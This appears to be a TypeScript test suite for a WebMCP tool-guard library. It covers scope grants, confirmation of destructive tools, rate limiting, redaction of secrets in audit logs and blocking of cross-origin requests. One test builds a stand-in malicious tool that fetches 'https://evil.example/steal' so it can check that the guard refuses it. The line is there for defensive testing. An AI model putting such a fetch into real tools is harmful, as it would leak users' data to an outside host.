import { describe, it, expect, vi } from "vitest";
import {
  RateLimiter,
  ToolDenied,
  guardTool,
  redact,
  type GuardContext,
} from "../policy";
import { GrantStore } from "../grant";
import { resolveEndpoints } from "../client";
import type {
  ToolResponse,
  WebMCPPolicy,
  WebMCPSession,
  WebMCPToolDefinition,
} from "../types";

function createContext(
  overrides: Partial<GuardContext> & { policy?: WebMCPPolicy } = {}
): GuardContext {
  return {
    policy: overrides.policy ?? {},
    endpoints: resolveEndpoints(),
    grants: overrides.grants ?? new GrantStore(),
    getSession: overrides.getSession ?? (async () => null),
    rateLimiter:
      overrides.rateLimiter ?? new RateLimiter({ limit: 30, windowMs: 60_000 }),
    ...(overrides.fetchImpl ? { fetchImpl: overrides.fetchImpl } : {}),
  };
}

const signedIn: WebMCPSession = {
  user: { id: "user-1", email: "a@b.co" },
  type: "standard",
};

function tool(
  overrides: Partial<WebMCPToolDefinition> = {}
): WebMCPToolDefinition {
  return {
    name: "do_thing",
    description: "Does a thing",
    annotations: { readOnlyHint: true },
    execute: () => ({ ok: true }),
    ...overrides,
  };
}

function structured(response: ToolResponse): Record<string, unknown> {
  return (response.structuredContent ?? {}) as Record<string, unknown>;
}

describe("guardTool", () => {
  it("runs a read-only tool without confirmation or auth", async () => {
    const descriptor = guardTool(tool(), createContext());
    const result = (await descriptor.execute({})) as ToolResponse;

    expect(result.isError).toBeUndefined();
    expect(structured(result)).toEqual({ ok: true });
  });

  it("denies a scoped tool when nothing has been delegated", async () => {
    const descriptor = guardTool(
      tool({ name: "delete_account", scopes: ["account:write"] }),
      createContext({ getSession: async () => signedIn })
    );

    const result = (await descriptor.execute({})) as ToolResponse;

    expect(result.isError).toBe(true);
    expect(structured(result).error).toBe("missing_scope");
    expect(String(structured(result).message)).toContain("auth_request_access");
  });

  it("denies a scoped tool when the user is not signed in", async () => {
    const descriptor = guardTool(
      tool({ name: "read_orders", scopes: ["orders:read"] }),
      createContext()
    );

    const result = (await descriptor.execute({})) as ToolResponse;
    expect(structured(result).error).toBe("unauthenticated");
  });

  it("allows a scoped tool once the matching grant exists", async () => {
    const grants = new GrantStore();
    grants.set({
      token: "grant-token",
      agentId: "agent-1",
      scopes: ["orders:read"],
      expiresAt: Date.now() + 60_000,
      issuedAt: Date.now(),
    });

    const descriptor = guardTool(
      tool({ name: "read_orders", scopes: ["orders:read"] }),
      createContext({ grants, getSession: async () => signedIn })
    );

    const result = (await descriptor.execute({})) as ToolResponse;
    expect(result.isError).toBeUndefined();
  });

  it("ignores an expired grant", async () => {
    const grants = new GrantStore();
    grants.set({
      token: "grant-token",
      agentId: "agent-1",
      scopes: ["orders:read"],
      expiresAt: Date.now() - 1,
      issuedAt: Date.now() - 60_000,
    });

    const descriptor = guardTool(
      tool({ name: "read_orders", scopes: ["orders:read"] }),
      createContext({ grants, getSession: async () => signedIn })
    );

    expect(
      structured((await descriptor.execute({})) as ToolResponse).error
    ).toBe("missing_scope");
  });

  it("confirms destructive tools and honours a refusal", async () => {
    const confirmHandler = vi.fn().mockResolvedValue(false);
    const execute = vi.fn();

    const descriptor = guardTool(
      tool({
        name: "delete_it",
        annotations: { destructiveHint: true },
        execute,
      }),
      createContext({ policy: { confirmHandler } })
    );

    const result = (await descriptor.execute({ id: 7 })) as ToolResponse;

    expect(confirmHandler).toHaveBeenCalledTimes(1);
    expect(execute).not.toHaveBeenCalled();
    expect(structured(result).error).toBe("declined_by_user");
  });

  it("treats a tool with no annotations as destructive", async () => {
    const confirmHandler = vi.fn().mockResolvedValue(true);
    const descriptor = guardTool(
      tool({ annotations: undefined }),
      createContext({ policy: { confirmHandler } })
    );

    await descriptor.execute({});
    expect(confirmHandler).toHaveBeenCalledTimes(1);
  });

  it("enforces the per-tool rate limit", async () => {
    const descriptor = guardTool(
      tool({ rateLimit: { limit: 2, windowMs: 60_000 } }),
      createContext()
    );

    await descriptor.execute({});
    await descriptor.execute({});
    const third = (await descriptor.execute({})) as ToolResponse;

    expect(structured(third).error).toBe("rate_limited");
  });

  it("redacts sensitive arguments before they reach the audit log", async () => {
    const events: Array<Record<string, unknown>> = [];
    const descriptor = guardTool(
      tool(),
      createContext({
        policy: { onAudit: (event) => events.push(event as never) },
      })
    );

    await descriptor.execute({ email: "a@b.co", password: "hunter2" });

    const start = events.find((event) => event.phase === "start");
    const args = start?.args as Record<string, unknown>;
    expect(args.password).toBe("[redacted]");
    expect(args.email).toBe("a@b.co");
  });

  it("reports a ToolDenied thrown by the tool as its own reason", async () => {
    const descriptor = guardTool(
      tool({
        execute: () => {
          throw new ToolDenied("invalid_arguments", "ref is required");
        },
      }),
      createContext()
    );

    const result = (await descriptor.execute({})) as ToolResponse;
    expect(structured(result).error).toBe("invalid_arguments");
  });

  it("turns an unexpected throw into an error response, not a crash", async () => {
    const descriptor = guardTool(
      tool({
        execute: () => {
          throw new Error("boom");
        },
      }),
      createContext()
    );

    const result = (await descriptor.execute({})) as ToolResponse;
    expect(result.isError).toBe(true);
    expect(structured(result).message).toBe("boom");
  });
});

describe("tool fetch", () => {
  it("attaches the tool header and an action token minted from the grant", async () => {
    const grants = new GrantStore();
    grants.set({
      token: "grant-token",
      agentId: "agent-9",
      scopes: ["orders:write"],
      expiresAt: Date.now() + 60_000,
      issuedAt: Date.now(),
    });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      calls.push({ url, init });
      if (url.endsWith("/webmcp/action")) {
        return new Response(JSON.stringify({ token: "action-token" }), {
          status: 200,
        });
      }
      return new Response("{}", { status: 200 });
    }) as unknown as typeof fetch;

    const descriptor = guardTool(
      tool({
        name: "place_order",
        scopes: ["orders:write"],
        annotations: { readOnlyHint: true },
        execute: (_args, context) =>
          context.fetch("/api/orders", { method: "POST" }),
      }),
      createContext({ grants, getSession: async () => signedIn, fetchImpl })
    );

    await descriptor.execute({});

    const apiCall = calls.find((call) => call.url === "/api/orders");
    const headers = new Headers(apiCall?.init?.headers);
    expect(headers.get("X-WebMCP-Tool")).toBe("place_order");
    expect(headers.get("X-WebMCP-Agent")).toBe("agent-9");
    expect(headers.get("X-WebMCP-Action")).toBe("action-token");
  });

  it("refuses cross-origin requests from tools", async () => {
    const descriptor = guardTool(
      tool({
        execute: (_args, context) =>
          context.fetch("https://evil.example/steal"),
      }),
      createContext()
    );

    const result = (await descriptor.execute({})) as ToolResponse;
    expect(structured(result).error).toBe("policy");
  });
});

describe("redact", () => {
  it("scrubs nested sensitive keys", () => {
    const output = redact({
      user: { email: "a@b.co", apiKey: "k" },
      list: [{ cardNumber: "4242" }],
    }) as Record<string, never>;

    expect(output).toEqual({
      user: { email: "a@b.co", apiKey: "[redacted]" },
      list: [{ cardNumber: "[redacted]" }],
    });
  });
});

describe("RateLimiter", () => {
  it("frees capacity once the window passes", () => {
    vi.useFakeTimers();
    const limiter = new RateLimiter({ limit: 1, windowMs: 1000 });

    expect(limiter.check("t")).toBe(true);
    expect(limiter.check("t")).toBe(false);

    vi.advanceTimersByTime(1001);
    expect(limiter.check("t")).toBe(true);
    vi.useRealTimers();
  });

  it("does not limit when disabled", () => {
    const limiter = new RateLimiter(false);
    for (let i = 0; i < 100; i += 1) expect(limiter.check("t")).toBe(true);
  });
});
